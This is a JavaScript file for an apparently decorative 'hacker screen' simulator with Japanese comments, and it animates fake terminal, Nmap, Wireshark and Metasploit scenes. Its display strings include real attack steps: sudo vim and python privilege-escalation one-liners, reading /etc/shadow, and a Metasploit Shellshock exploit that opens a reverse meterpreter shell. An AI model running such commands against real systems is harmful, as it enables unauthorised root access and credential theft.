let currentScene = null;
let animationInterval = null;
let matrixIntervals = [];
let isFullscreen = false;
let timeLimit = 0;
let timeRemaining = 0;
let timerInterval = null;
let soundEnabled = false;
let audioContext = null;

// Mobile touch handling
let touchStartTime = 0;
let touchStartY = 0;
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// Audio setup
function initAudio() {
    if (soundEnabled && !audioContext) {
        try {
            audioContext = new (window.AudioContext || window.webkitAudioContext)();
        } catch (e) {
            console.log('Audio not supported');
        }
    }
}

function playBeep(frequency = 800, duration = 100) {
    if (!soundEnabled || !audioContext) return;
    
    try {
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.value = frequency;
        gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration / 1000);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + duration / 1000);
    } catch (e) {
        console.log('Audio playback failed');
    }
}

// Linux Terminal シーン
const linuxCommands = [
    'root@hackbox:~# nmap -sS -A 192.168.1.0/24',
    'Starting Nmap 7.94 ( https://nmap.org ) at 2024-11-15 14:32 JST',
    'Nmap scan report for router.local (192.168.1.1)',
    'Host is up (0.001s latency).',
    'PORT     STATE SERVICE    VERSION',
    '22/tcp   open  ssh        OpenSSH 8.9p1',
    '80/tcp   open  http       nginx 1.18.0',
    '443/tcp  open  https      nginx 1.18.0',
    'MAC Address: AA:BB:CC:DD:EE:FF (Cisco Systems)',
    '',
    'Nmap scan report for server.local (192.168.1.100)',
    'Host is up (0.0025s latency).',
    'PORT     STATE SERVICE    VERSION',
    '21/tcp   open  ftp        vsftpd 3.0.3',
    '22/tcp   open  ssh        OpenSSH 8.9p1',
    '80/tcp   open  http       Apache httpd 2.4.41',
    '443/tcp  open  https      Apache httpd 2.4.41',
    '3306/tcp open  mysql      MySQL 8.0.27',
    '',
    'root@hackbox:~# ssh admin@192.168.1.100',
    'admin@192.168.1.100\'s password: ',
    'Last login: Thu Nov 14 18:45:23 2024 from 192.168.1.50',
    'admin@target:~$ whoami',
    'admin',
    'admin@target:~$ sudo -l',
    'User admin may run the following commands on target:',
    '    (ALL : ALL) NOPASSWD: /usr/bin/vim',
    'admin@target:~$ sudo vim -c \'!sh\' /dev/null',
    'root@target:/home/admin# id',
    'uid=0(root) gid=0(root) groups=0(root)',
    'root@target:/home/admin# cat /etc/shadow',
    'root:$6$xyz123$abc...def:19000:0:99999:7:::',
    'admin:$6$uvw456$ghi...jkl:19000:0:99999:7:::',
    'user1:$6$mno789$pqr...stu:19000:0:99999:7:::',
    '',
    'root@target:/home/admin# find / -name "*.conf" -type f 2>/dev/null | head -10',
    '/etc/apache2/apache2.conf',
    '/etc/mysql/mysql.conf.d/mysqld.conf',
    '/etc/ssh/sshd_config',
    '/etc/nginx/nginx.conf',
    '/etc/systemd/system.conf',
    '',
    'root@target:/home/admin# cat /root/flag.txt',
    'CTF{R00t_4cc355_4ch13v3d_v14_5ud0_v1m}'
];

// Matrix シーン用文字（バイナリコード）
const matrixChars = '01';

// Retro シーン
const retroCommands = [
    '>>> INITIALIZING CYBER WARFARE TOOLKIT v2.1',
    '>>> LOADING NEURAL INTERFACE...',
    '[████████████████████████████████] 100%',
    '>>> CONNECTION TO MAINFRAME ESTABLISHED',
    '>>> IDENTITY: PHANTOM_H4CKER',
    '>>> CLEARANCE LEVEL: ALPHA-7',
    '',
    '>>> SCANNING TARGET NETWORK...',
    '>>> 192.168.0.0/16 SUBNET DETECTED',
    '>>> 2,847 HOSTS DISCOVERED',
    '>>> VULNERABILITY ASSESSMENT INITIATED',
    '',
    '[EXPLOITING] Buffer Overflow in Service Port 21',
    '[SUCCESS] Shell Access Acquired',
    '[EXPLOITING] SQL Injection in Web Portal',
    '[SUCCESS] Database Access Granted',
    '[EXPLOITING] Privilege Escalation via SUID Binary',
    '[SUCCESS] Root Access Achieved',
    '',
    '>>> INSTALLING PERSISTENT BACKDOOR...',
    '>>> BACKDOOR MODULE: SHADOW_GHOST v3.2',
    '>>> INSTALLATION COMPLETE',
    '>>> STEALTH MODE: ACTIVATED',
    '',
    '>>> EXFILTRATING CLASSIFIED DATA...',
    'financial_records.db     [████████████████] 1.2GB',
    'user_credentials.txt     [████████████████] 256MB',
    'project_blueprints.zip   [████████████████] 3.4GB',
    'government_contracts.pdf [████████████████] 89MB',
    '',
    '>>> ANTI-FORENSICS PROTOCOLS ACTIVE',
    '>>> LOG ERASURE: COMPLETE',
    '>>> TIMESTAMP MANIPULATION: COMPLETE',
    '>>> DIGITAL FINGERPRINTS: ELIMINATED',
    '',
    '>>> MISSION STATUS: OPERATION SUCCESSFUL',
    '>>> DISCONNECTING FROM MATRIX...',
    '>>> GHOST MODE ACTIVATED',
    ''
];

// Nmap シーン
const nmapCommands = [
    'Starting Nmap 7.94 ( https://nmap.org ) at 2024-11-15 14:35 JST',
    'NSE: Loaded 156 scripts for scanning.',
    'NSE: Script Pre-scanning.',
    'Initiating ARP Ping Scan at 14:35',
    'Scanning 192.168.1.0/24 [256 hosts]',
    'Completed ARP Ping Scan at 14:35, 2.15s elapsed (256 total hosts)',
    'Initiating Parallel DNS resolution of 12 hosts at 14:35',
    'Completed Parallel DNS resolution of 12 hosts at 14:35, 0.02s elapsed',
    'Initiating SYN Stealth Scan at 14:35',
    'Scanning 12 hosts [1000 ports/host]',
    'Discovered open port 443/tcp on 192.168.1.1',
    'Discovered open port 80/tcp on 192.168.1.1',
    'Discovered open port 22/tcp on 192.168.1.100',
    'Discovered open port 3306/tcp on 192.168.1.100',
    'Discovered open port 21/tcp on 192.168.1.100',
    'Discovered open port 135/tcp on 192.168.1.150',
    'Discovered open port 445/tcp on 192.168.1.150',
    'Completed SYN Stealth Scan at 14:35, 8.45s elapsed (12000 total ports)',
    'Initiating Service scan at 14:35',
    'Scanning 7 services on 3 hosts',
    'Completed Service scan at 14:35, 6.12s elapsed (7 services on 3 hosts)',
    'NSE: Script scanning 3 hosts.',
    'Initiating NSE at 14:35',
    'Completed NSE at 14:35, 2.34s elapsed',
    '',
    'Nmap scan report for gateway.local (192.168.1.1)',
    'Host is up (0.0012s latency).',
    'Not shown: 997 closed ports',
    'PORT    STATE SERVICE  VERSION',
    '22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1',
    '80/tcp  open  http     nginx 1.18.0 (Ubuntu)',
    '443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)',
    'MAC Address: AA:BB:CC:DD:EE:FF (Cisco Systems)',
    'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel',
    '',
    'Nmap scan report for server.local (192.168.1.100)',
    'Host is up (0.0025s latency).',
    'Not shown: 995 closed ports',
    'PORT     STATE SERVICE  VERSION',
    '21/tcp   open  ftp      vsftpd 3.0.3',
    '22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1',
    '80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))',
    '443/tcp  open  ssl/http Apache httpd 2.4.41 ((Ubuntu))',
    '3306/tcp open  mysql    MySQL 8.0.27-0ubuntu0.20.04.1',
    'MAC Address: 11:22:33:44:55:66 (Dell Inc.)',
    'Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel',
    '',
    'Nmap scan report for workstation.local (192.168.1.150)',
    'Host is up (0.0018s latency).',
    'Not shown: 998 closed ports',
    'PORT    STATE SERVICE      VERSION',
    '135/tcp open  msrpc        Microsoft Windows RPC',
    '445/tcp open  microsoft-ds Windows 10 Pro (workgroup: WORKGROUP)',
    'MAC Address: 77:88:99:AA:BB:CC (Microsoft Corporation)',
    'Service Info: Host: DESKTOP-ABC123; OS: Windows; CPE: cpe:/o:microsoft:windows',
    '',
    'Host script results:',
    '|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s',
    '| smb-security-mode:',
    '|   account_used: guest',
    '|   authentication_level: user',
    '|   challenge_response: supported',
    '|_  message_signing: disabled (dangerous, but default)',
    '',
    'Service detection performed. Please report any incorrect results at https://nmap.org/submit/',
    'Nmap done: 256 IP addresses (3 hosts up) scanned in 18.95 seconds'
];

// Wireshark シーン
const wiresharkData = [
    'Frame 1: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)',
    '    Encapsulation type: Ethernet (1)',
    '    Arrival Time: Nov 15, 2024 14:35:42.123456789 JST',
    '    [Time shift for this packet: 0.000000000 seconds]',
    '    Epoch Time: 1731650142.123456789 seconds',
    '    [Time delta from previous captured frame: 0.000000000 seconds]',
    '    [Time delta from previous displayed frame: 0.000000000 seconds]',
    '    [Time since reference or first frame: 0.000000000 seconds]',
    '    Frame Number: 1',
    '    Frame Length: 74 bytes (592 bits)',
    '    Capture Length: 74 bytes (592 bits)',
    '',
    'Ethernet II, Src: Dell_44:55:66 (11:22:33:44:55:66), Dst: Cisco_dd:ee:ff (aa:bb:cc:dd:ee:ff)',
    '    Destination: Cisco_dd:ee:ff (aa:bb:cc:dd:ee:ff)',
    '    Source: Dell_44:55:66 (11:22:33:44:55:66)',
    '    Type: IPv4 (0x0800)',
    '',
    'Internet Protocol Version 4, Src: 192.168.1.100, Dst: 192.168.1.50',
    '    0100 .... = Version: 4',
    '    .... 0101 = Header Length: 20 bytes (5)',
    '    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)',
    '    Total Length: 60',
    '    Identification: 0x1234 (4660)',
    '    Flags: 0x4000, Don\'t fragment',
    '    Fragment offset: 0',
    '    Time to live: 64',
    '    Protocol: TCP (6)',
    '    Header checksum: 0x7a3b [validation disabled]',
    '    [Header checksum status: Unverified]',
    '    Source: 192.168.1.100',
    '    Destination: 192.168.1.50',
    '',
    'Transmission Control Protocol, Src Port: 443, Dst Port: 55234, Seq: 0, Ack: 1, Len: 0',
    '    Source Port: 443',
    '    Destination Port: 55234',
    '    [Stream index: 0]',
    '    [TCP Segment Len: 0]',
    '    Sequence number: 0    (relative sequence number)',
    '    [Next sequence number: 1    (relative sequence number)]',
    '    Acknowledgment number: 1    (relative ack number)',
    '    0101 .... = Header Length: 20 bytes (5)',
    '    Flags: 0x010 (ACK)',
    '    Window size value: 65535',
    '    [Calculated window size: 65535]',
    '    Checksum: 0x8f2a [unverified]',
    '    [Checksum Status: Unverified]',
    '    Urgent pointer: 0',
    '',
    'Frame 2: 1518 bytes on wire (12144 bits), 1518 bytes captured (12144 bits)',
    'Frame 3: 66 bytes on wire (528 bits), 66 bytes captured (528 bits)',
    'Frame 4: 118 bytes on wire (944 bits), 118 bytes captured (944 bits)',
    'Frame 5: 1434 bytes on wire (11472 bits), 1434 bytes captured (11472 bits)',
    '',
    '[Expert Info (Warning/Protocol): TCP retransmission]',
    '[TCP retransmission] [Expert Info (Note/Sequence): This frame is a (suspected) retransmission]',
    '[Expert Info (Warning/Security): Unencrypted HTTP traffic detected]',
    '[HTTP] GET /admin/login.php HTTP/1.1',
    '[HTTP] User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/91.0',
    '[HTTP] Authorization: Basic YWRtaW46cGFzc3dvcmQ='
];

// Metasploit シーン用アスキーアート
const metasploitAsciiArts = [
    [
        '',
        '    .:okOOOkdc\'',
        '  :kOOOOOOOOOOOk:',
        ' .xOOOOOOOOOOOOOOx.',
        ' lOOOOOOOOOOOOOOOOl',
        ' ..\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'.. \'',
    ],
    [
        '',
        '         .-.  .-.',
        '        /   \\/   \\',
        '       | .-.    .-. |',
        '       |/   \\  /   \\|',
        '        \\   /  \\   /',
        '         \'-\'    \'-\'',
    ],
    [
        '',
        '      /\\_/\\  /\\_/\\',
        '     ( o.o )( o.o )',
        '      > ^ <  > ^ <',
        '     /     \\/     \\',
        '    (  ||  )(  ||  )',
        '',
    ],
    [
        '',
        '    ┌─┐┌─┐┌─┐┌─┐',
        '    │ ││ ││ ││ │',
        '    └─┘└─┘└─┘└─┘',
        '     H A C K',
        '',
    ],
    [
        '',
        '       /\\_/\\',
        '      /     \\',
        '     /  ^ ^  \\',
        '    |  (o) (o) |',
        '     \\    <   /',
        '      \\  ---  /',
        '       \\_____/',
    ]
];

// Metasploit シーン
function getRandomMetasploitArt() {
    const randomArt = metasploitAsciiArts[Math.floor(Math.random() * metasploitAsciiArts.length)];
    return [
        ...randomArt,
        '       =[ metasploit v6.3.42-dev                          ]',
        '+ -- --=[ 2346 exploits - 1219 auxiliary - 413 post       ]',
        '+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]',
        '+ -- --=[ 9 evasion                                       ]',
        '',
        'Metasploit tip: Use the edit command to open the currently',
        'active module in your editor',
        '',
        'msf6 > use exploit/linux/http/apache_mod_cgi_bash_env_exec',
        '[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp',
        'msf6 exploit(linux/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.1.100',
        'RHOSTS => 192.168.1.100',
        'msf6 exploit(linux/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/test.sh',
        'TARGETURI => /cgi-bin/test.sh',
        'msf6 exploit(linux/http/apache_mod_cgi_bash_env_exec) > set LHOST 192.168.1.50',
        'LHOST => 192.168.1.50',
        'msf6 exploit(linux/http/apache_mod_cgi_bash_env_exec) > exploit',
        '',
        '[*] Started reverse TCP handler on 192.168.1.50:4444',
        '[*] Command Stager progress - 100.00% done (919/919 bytes)',
        '[*] Sending stage (989032 bytes) to 192.168.1.100',
        '[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:35478)',
        '',
        'meterpreter > sysinfo',
        'Computer     : server.local',
        'OS           : Ubuntu 20.04.6 LTS (Linux 5.4.0-150-generic)',
        'Architecture : x64',
        'BuildTuple   : x86_64-linux-musl',
        'Meterpreter  : x64/linux',
        'meterpreter > getuid',
        'Server username: www-data',
        'meterpreter > ps',
        '',
        'Process List',
        '============',
        '',
        ' PID   PPID  Name                  Arch  Session  User     Path',
        ' ---   ----  ----                  ----  -------  ----     ----',
        ' 1     0     systemd               x64   0        root     /sbin/init',
        ' 2     0     kthreadd              x64   0        root     ',
        ' 1023  1     apache2               x64   0        www-data /usr/sbin/apache2',
        ' 1537  1023  apache2               x64   0        www-data /usr/sbin/apache2',
        ' 2245  1     mysqld                x64   0        mysql    /usr/sbin/mysqld',
        '',
        'meterpreter > shell',
        'Process 1789 created.',
        'Channel 1 created.',
        'whoami',
        'www-data',
        'sudo -l',
        'Matching Defaults entries for www-data on server:',
        '    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin',
        '',
        'User www-data may run the following commands on server:',
        '    (ALL : ALL) NOPASSWD: /usr/bin/python3',
        'sudo python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
        'root@server:/var/www/html# id',
        'uid=0(root) gid=0(root) groups=0(root)',
        'root@server:/var/www/html# cat /root/flag.txt',
        'CTF{M3t45pl01t_Pwn4g3_C0mpl3t3d!}'
    ];
}

function startScene(sceneType) {
    // 設定を取得
    timeLimit = parseInt(document.getElementById('timeLimit').value);
    soundEnabled = document.getElementById('soundEffect').value === 'on';
    
    if (soundEnabled) {
        initAudio();
    }
    
    currentScene = sceneType;
    document.getElementById('sceneSelector').style.display = 'none';
    document.getElementById('simulator').style.display = 'block';
    
    // タイマー表示
    if (timeLimit > 0) {
        timeRemaining = timeLimit;
        document.getElementById('timerDisplay').style.display = 'block';
        updateTimerDisplay();
        timerInterval = setInterval(() => {
            timeRemaining--;
            updateTimerDisplay();
            if (timeRemaining <= 0) {
                stopScene();
            }
        }, 1000);
    }
    
    // フルスクリーンにする
    enterFullscreen();
    
    // 終了ヒントを更新
    updateExitHint();
    
    const content = document.getElementById('sceneContent');
    content.innerHTML = '';
    
    switch(sceneType) {
        case 'linux':
            content.className = 'terminal';
            startLinuxScene();
            break;
        case 'matrix':
            content.className = 'matrix';
            startMatrixScene();
            break;
        case 'retro':
            content.className = 'retro';
            startRetroScene();
            break;
        case 'nmap':
            content.className = 'nmap';
            startNmapScene();
            break;
        case 'wireshark':
            content.className = 'wireshark';
            startWiresharkScene();
            break;
        case 'metasploit':
            content.className = 'metasploit';
            startMetasploitScene();
            break;
    }
}

function updateTimerDisplay() {
    const minutes = Math.floor(timeRemaining / 60);
    const seconds = timeRemaining % 60;
    document.getElementById('timerDisplay').textContent = 
        `残り時間: ${minutes}:${seconds.toString().padStart(2, '0')}`;
}

function startLinuxScene() {
    const content = document.getElementById('sceneContent');
    let lineIndex = 0;
    let isWaiting = false;
    
    animationInterval = setInterval(() => {
        if (isWaiting) return;
        
        if (lineIndex < linuxCommands.length) {
            const line = document.createElement('div');
            line.className = 'output-line';
            
            if (linuxCommands[lineIndex].includes('#') || linuxCommands[lineIndex].includes('$')) {
                line.className += ' command-prompt';
            }
            if (linuxCommands[lineIndex].includes('error') || linuxCommands[lineIndex].includes('ERROR')) {
                line.className += ' error-text';
            }
            if (linuxCommands[lineIndex].includes('success') || linuxCommands[lineIndex].includes('SUCCESS')) {
                line.className += ' success-text';
            }
            
            line.textContent = linuxCommands[lineIndex];
            content.appendChild(line);
            
            if (soundEnabled && linuxCommands[lineIndex].includes('#')) {
                playBeep(1200, 50);
            }
            
            content.scrollTop = content.scrollHeight;
            lineIndex++;
        } else {
            isWaiting = true;
            setTimeout(() => {
                lineIndex = 0;
                content.innerHTML = '';
                isWaiting = false;
            }, 5000);
        }
    }, Math.random() * 1000 + 500);
}

function startMatrixScene() {
    const content = document.getElementById('sceneContent');
    // モバイル対応：画面サイズに応じて文字間隔を調整
    const charWidth = isMobile ? (window.innerWidth < 480 ? 12 : 16) : 20;
    const columns = Math.floor(window.innerWidth / charWidth);
    const rows = Math.floor(window.innerHeight / (charWidth + 2));
    
    // 各列の状態を管理
    const columnStates = [];
    for (let i = 0; i < columns; i++) {
        columnStates.push({
            chars: [],
            speed: Math.random() * 6 + 3, // 3-9の速度
            nextChar: Math.random() * 50
        });
    }
    
    // メインループ
    const matrixInterval = setInterval(() => {
        columnStates.forEach((column, colIndex) => {
            column.nextChar--;
            
            // 新しい文字を追加（画面上部から、または途中からランダムに）
            if (column.nextChar <= 0) {
                // 30%の確率で途中の位置から開始
                const startY = Math.random() < 0.3 ? Math.random() * window.innerHeight * 0.6 : 0;
                
                column.chars.push({
                    char: matrixChars[Math.floor(Math.random() * matrixChars.length)],
                    y: startY,
                    opacity: 1,
                    element: null
                });
                column.nextChar = Math.random() * 15 + 5; // 文字生成間隔
            }
            
            // 既存の文字を更新
            column.chars.forEach((charObj, charIndex) => {
                charObj.y += column.speed;
                
                // 透明度の計算を調整（画面の80%まで見えるように）
                const fadeStart = window.innerHeight * 0.6; // 画面の60%から薄くなり始める
                if (charObj.y > fadeStart) {
                    charObj.opacity = Math.max(0, 1 - ((charObj.y - fadeStart) / (window.innerHeight * 0.4)));
                } else {
                    charObj.opacity = 1;
                }
                
                // DOM要素を作成または更新
                if (!charObj.element) {
                    charObj.element = document.createElement('div');
                    charObj.element.className = 'matrix-char';
                    charObj.element.style.left = (colIndex * charWidth) + 'px';
                    content.appendChild(charObj.element);
                }
                
                charObj.element.textContent = charObj.char;
                charObj.element.style.top = charObj.y + 'px';
                
                // 色を設定（先頭は明るく、後ろは暗く）
                if (charIndex === column.chars.length - 1) {
                    charObj.element.style.color = '#ffffff'; // 先頭は白
                } else {
                    const green = Math.floor(255 * charObj.opacity);
                    charObj.element.style.color = `rgb(0, ${green}, 0)`;
                }
                
                // 文字をランダムに変更
                if (Math.random() < 0.2) {
                    charObj.char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
                }
            });
            
            // 画面外の文字を削除
            column.chars = column.chars.filter(charObj => {
                if (charObj.y > window.innerHeight + 50) {
                    if (charObj.element && charObj.element.parentNode) {
                        charObj.element.parentNode.removeChild(charObj.element);
                    }
                    return false;
                }
                return true;
            });
        });
        
        // 音響効果
        if (soundEnabled && Math.random() < 0.05) {
            playBeep(800 + Math.random() * 400, 30);
        }
    }, 30);
    
    matrixIntervals.push(matrixInterval);
}

function startRetroScene() {
    const content = document.getElementById('sceneContent');
    let lineIndex = 0;
    let isWaiting = false;
    
    animationInterval = setInterval(() => {
        if (isWaiting) return;
        
        if (lineIndex < retroCommands.length) {
            const line = document.createElement('div');
            line.className = 'output-line';
            
            if (retroCommands[lineIndex].includes('[SUCCESS]')) {
                line.className += ' success-text';
            } else if (retroCommands[lineIndex].includes('[EXPLOITING]')) {
                line.className += ' warning-text';
            } else if (retroCommands[lineIndex].includes('>>>')) {
                line.className += ' info-text';
            }
            
            line.textContent = retroCommands[lineIndex];
            content.appendChild(line);
            
            if (soundEnabled && retroCommands[lineIndex].includes('[SUCCESS]')) {
                playBeep(1500, 200);
            }
            
            content.scrollTop = content.scrollHeight;
            lineIndex++;
        } else {
            isWaiting = true;
            setTimeout(() => {
                lineIndex = 0;
                content.innerHTML = '';
                isWaiting = false;
            }, 5000);
        }
    }, Math.random() * 1500 + 800);
}

function startNmapScene() {
    const content = document.getElementById('sceneContent');
    let lineIndex = 0;
    let isWaiting = false;
    
    animationInterval = setInterval(() => {
        if (isWaiting) return;
        
        if (lineIndex < nmapCommands.length) {
            const line = document.createElement('div');
            line.className = 'output-line';
            
            if (nmapCommands[lineIndex].includes('Discovered open port')) {
                line.className += ' success-text';
            } else if (nmapCommands[lineIndex].includes('Starting') || nmapCommands[lineIndex].includes('Initiating')) {
                line.className += ' info-text';
            } else if (nmapCommands[lineIndex].includes('Completed')) {
                line.className += ' warning-text';
            }
            
            line.textContent = nmapCommands[lineIndex];
            content.appendChild(line);
            
            if (soundEnabled && nmapCommands[lineIndex].includes('Discovered open port')) {
                playBeep(900, 100);
            }
            
            content.scrollTop = content.scrollHeight;
            lineIndex++;
        } else {
            isWaiting = true;
            setTimeout(() => {
                lineIndex = 0;
                content.innerHTML = '';
                isWaiting = false;
            }, 5000);
        }
    }, Math.random() * 800 + 400);
}

function startWiresharkScene() {
    const content = document.getElementById('sceneContent');
    let lineIndex = 0;
    let isWaiting = false;
    
    animationInterval = setInterval(() => {
        if (isWaiting) return;
        
        if (lineIndex < wiresharkData.length) {
            const line = document.createElement('div');
            line.className = 'output-line';
            
            if (wiresharkData[lineIndex].includes('Frame')) {
                line.className += ' command-prompt';
            } else if (wiresharkData[lineIndex].includes('Expert Info')) {
                line.className += ' warning-text';
            } else if (wiresharkData[lineIndex].includes('HTTP')) {
                line.className += ' error-text';
            } else if (wiresharkData[lineIndex].includes('TCP') || wiresharkData[lineIndex].includes('IP')) {
                line.className += ' info-text';
            }
            
            line.textContent = wiresharkData[lineIndex];
            content.appendChild(line);
            
            if (soundEnabled && wiresharkData[lineIndex].includes('Expert Info')) {
                playBeep(600, 150);
            }
            
            content.scrollTop = content.scrollHeight;
            lineIndex++;
        } else {
            isWaiting = true;
            setTimeout(() => {
                lineIndex = 0;
                content.innerHTML = '';
                isWaiting = false;
            }, 5000);
        }
    }, Math.random() * 600 + 300);
}

function startMetasploitScene() {
    const content = document.getElementById('sceneContent');
    let lineIndex = 0;
    let isWaiting = false;
    const metasploitCommands = getRandomMetasploitArt(); // ランダムアスキーアート
    
    animationInterval = setInterval(() => {
        if (isWaiting) return;
        
        if (lineIndex < metasploitCommands.length) {
            const line = document.createElement('div');
            line.className = 'output-line';
            
            if (metasploitCommands[lineIndex].includes('msf6') || metasploitCommands[lineIndex].includes('meterpreter')) {
                line.className += ' command-prompt';
                line.style.color = '#ff6b6b';
            } else if (metasploitCommands[lineIndex].includes('[*]')) {
                line.className += ' info-text';
                line.style.color = '#4ecdc4';
            } else if (metasploitCommands[lineIndex].includes('CTF{')) {
                line.className += ' success-text';
                line.style.color = '#ffe66d';
            } else if (metasploitCommands[lineIndex].includes('root@')) {
                line.className += ' error-text';
                line.style.color = '#ff8b94';
            }
            
            line.textContent = metasploitCommands[lineIndex];
            content.appendChild(line);
            
            if (soundEnabled && metasploitCommands[lineIndex].includes('Meterpreter session')) {
                playBeep(1000, 300);
            }
            
            content.scrollTop = content.scrollHeight;
            lineIndex++;
        } else {
            isWaiting = true;
            setTimeout(() => {
                lineIndex = 0;
                content.innerHTML = '';
                isWaiting = false;
            }, 5000);
        }
    }, Math.random() * 1200 + 600);
}

function enterFullscreen() {
    try {
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        } else if (document.documentElement.webkitRequestFullscreen) {
            document.documentElement.webkitRequestFullscreen();
        } else if (document.documentElement.msRequestFullscreen) {
            document.documentElement.msRequestFullscreen();
        }
        isFullscreen = true;
    } catch (e) {
        console.log('Fullscreen not supported');
    }
}

function exitFullscreen() {
    try {
        if (document.exitFullscreen) {
            document.exitFullscreen();
        } else if (document.webkitExitFullscreen) {
            document.webkitExitFullscreen();
        } else if (document.msExitFullscreen) {
            document.msExitFullscreen();
        }
        isFullscreen = false;
    } catch (e) {
        console.log('Exit fullscreen failed');
    }
}

function stopScene() {
    if (animationInterval) {
        clearInterval(animationInterval);
        animationInterval = null;
    }
    
    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
    }
    
    // Matrix用のインターバルをクリア
    matrixIntervals.forEach(interval => clearInterval(interval));
    matrixIntervals = [];
    
    if (isFullscreen) {
        exitFullscreen();
    }
    
    document.getElementById('simulator').style.display = 'none';
    document.getElementById('sceneSelector').style.display = 'flex';
    document.getElementById('timerDisplay').style.display = 'none';
    currentScene = null;
}

// キーボードイベント
document.addEventListener('keydown', function(e) {
    if (currentScene) {
        if (e.key === 'Escape' || e.key === 'q' || e.key === 'Q') {
            stopScene();
        }
        e.preventDefault();
        return false;
    }
});

// フルスクリーン変更イベント
document.addEventListener('fullscreenchange', function() {
    if (!document.fullscreenElement && currentScene) {
        stopScene();
    }
});

document.addEventListener('webkitfullscreenchange', function() {
    if (!document.webkitFullscreenElement && currentScene) {
        stopScene();
    }
});

// タッチイベント（モバイル対応）
document.addEventListener('touchstart', function(e) {
    if (currentScene) {
        touchStartTime = Date.now();
        touchStartY = e.touches[0].clientY;
        e.preventDefault();
    }
}, { passive: false });

document.addEventListener('touchend', function(e) {
    if (currentScene) {
        const touchEndTime = Date.now();
        const touchEndY = e.changedTouches[0].clientY;
        const touchDuration = touchEndTime - touchStartTime;
        const touchDistance = Math.abs(touchEndY - touchStartY);
        
        // タップ（短時間かつ短距離）またはダブルタップで終了
        if (touchDuration < 500 && touchDistance < 30) {
            stopScene();
        }
        
        // 上スワイプで終了
        if (touchDistance > 100 && (touchStartY - touchEndY) > 50) {
            stopScene();
        }
        
        e.preventDefault();
    }
}, { passive: false });

// 画面回転時のリサイズ対応
window.addEventListener('orientationchange', function() {
    if (currentScene === 'matrix') {
        // Matrixシーンの場合は再起動
        setTimeout(() => {
            if (currentScene === 'matrix') {
                const content = document.getElementById('sceneContent');
                content.innerHTML = '';
                matrixIntervals.forEach(interval => clearInterval(interval));
                matrixIntervals = [];
                startMatrixScene();
            }
        }, 100);
    }
});

// ウィンドウリサイズ時の対応
window.addEventListener('resize', function() {
    if (currentScene === 'matrix') {
        // 少し遅延させてからMatrixシーンを再初期化
        setTimeout(() => {
            if (currentScene === 'matrix') {
                const content = document.getElementById('sceneContent');
                content.innerHTML = '';
                matrixIntervals.forEach(interval => clearInterval(interval));
                matrixIntervals = [];
                startMatrixScene();
            }
        }, 200);
    }
});

// モバイルブラウザのアドレスバー表示/非表示に対応
window.addEventListener('scroll', function() {
    if (currentScene) {
        window.scrollTo(0, 0);
    }
});

// iOS Safari対応：音声再生の準備
document.addEventListener('touchstart', function() {
    if (soundEnabled && audioContext && audioContext.state === 'suspended') {
        audioContext.resume();
    }
}, { once: true });

// exitHintの表示テキストをデバイスに応じて変更
function updateExitHint() {
    const exitHint = document.getElementById('exitHint');
    if (exitHint) {
        if (isMobile) {
            exitHint.textContent = 'タップまたは上スワイプで終了';
        } else {
            exitHint.textContent = 'ESCキーで終了';
        }
    }
}

// 初期化時にヒントテキストを設定
document.addEventListener('DOMContentLoaded', updateExitHint);